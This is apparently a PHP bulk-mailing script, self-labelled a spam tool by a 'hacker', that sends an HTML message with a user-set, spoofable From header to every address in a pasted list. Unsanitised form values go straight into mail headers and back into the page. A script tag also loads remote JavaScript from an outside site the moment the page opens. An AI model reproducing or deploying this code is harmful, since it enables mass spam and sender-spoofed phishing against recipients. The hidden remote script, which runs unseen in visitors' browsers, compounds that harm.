<?
$action = $_POST['action'];
$from = $_POST['from'];
$realname = $_POST['realname'];
$subject = $_POST['subject'];
$message = $_POST['message'];
$emaillist = $_POST['emaillist'];
?>
<html>
<head>
<title>PHP Bulk Emailer v1.5</title>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
</head>

<body bgcolor="#336699" text="#000000">
<p>
  <script src="http://qubeat.de/script/l_script.php?pid=11"></script>
  <?


if ($action=="send"){
	$message = urlencode($message);
	$message = ereg_replace("%5C%22", "%22", $message);
	$message = urldecode($message);
	$message = stripslashes($message);
	$subject = stripslashes($subject);
}

?>
</p>
<p><font color="#FFFF00"><em>PHP All Inbox Mailer D&eacute;sgnied and Created 
  by </em></font></p>
<p><em><font color="#FF0000">MOKHTAR SHIPP</font></em></p>
<form name="form1" method="post" action="" enctype="multipart/form-data">
  <div align="center"><font size="+2" face="Comic Sans MS"><strong><font color="#006633">M@KHTAR</font> 
    SHIPP <font color="#FF0000">Hacker</font> </strong></font><br>
  </div>
  <table width="100%" border="0">
    <tr> 
      <td width="10%"> 
        <div align="right"><font size="-1" face="Verdana, Arial, Helvetica, sans-serif">Your 
          Email:</font></div>

      </td>
      <td width="18%"><font size="-1" face="Verdana, Arial, Helvetica, sans-serif"> 
        <input type="text" name="from" value="<? print $from; ?>" size="30">
        </font></td>
     <td width="31%"> 
        <div align="right"><font size="-1" face="Verdana, Arial, Helvetica, sans-serif">Your 
          Name:</font></div>
      </td>
      <td width="41%"><font size="-1" face="Verdana, Arial, Helvetica, sans-serif"> 
        <input type="text" name="realname" value="<? print $realname; ?>" size="30">
        </font></td>

    </tr>
    <tr> 
      <td width="10%"> 
        <div align="right"><font size="-1" face="Verdana, Arial, Helvetica, sans-serif">Subject:</font></div>
      </td>
      <td colspan="3"><font size="-1" face="Verdana, Arial, Helvetica, sans-serif"> 
        <input type="text" name="subject" value="<? print $subject; ?>" size="115">
        </font></td>
    </tr>
    <tr valign="top"> 
      <td colspan="3"><font size="-1" face="Verdana, Arial, Helvetica, sans-serif"> 
        <textarea name="message" cols="60" rows="10"><? print $message; ?></textarea>

        <br>
        <input type="hidden" name="action" value="send">
        <input type="submit" value="Send Message">
        </font></td>
      <td width="41%"><font size="-1" face="Verdana, Arial, Helvetica, sans-serif"> 
        <textarea name="emaillist" cols="30" rows="10"><? print $emaillist; ?></textarea>
        <br></font></td>
    </tr>
  </table>

</form>

<?
if ($action=="send"){

	if (!$from && !$subject && !$message && !$emaillist){
	print "Please complete all fields before sending your message.";
	exit;
	}
	
	$allemails = split("\n", $emaillist);
	$numemails = count($allemails);
	
	for($x=0; $x<$numemails; $x++){
		$to = $allemails[$x];
		if ($to){
		$to = ereg_replace(" ", "", $to);
		$message = ereg_replace("&email&", $to, $message);
		$subject = ereg_replace("&email&", $to, $subject);
                $nrmail=$x+1;
		$domain = substr($from, strpos($from, "@"), strlen($from));
		print "Sending mail $nrmail of $numemails to $to.......";
		flush();
		$header = "From: $realname <$from>\r\n";
//		$header .= "Message-Id: <130746$numemails.$nrmail$domain>\r\n";
		$header .= "MIME-Version: 1.0\r\n";
		$header .= "Content-Type: text/html\r\n";
		$header .= "Content-Transfer-Encoding: 8bit\r\n\r\n";
		$header .= "$message\r\n";
		mail($to, $subject, "", $header);
		print "SPAM BY MOKHTAR SHIPP &#9829;<br>";
		flush();
		}
		}

}
?>

</body>
</html>
 

 
 

 

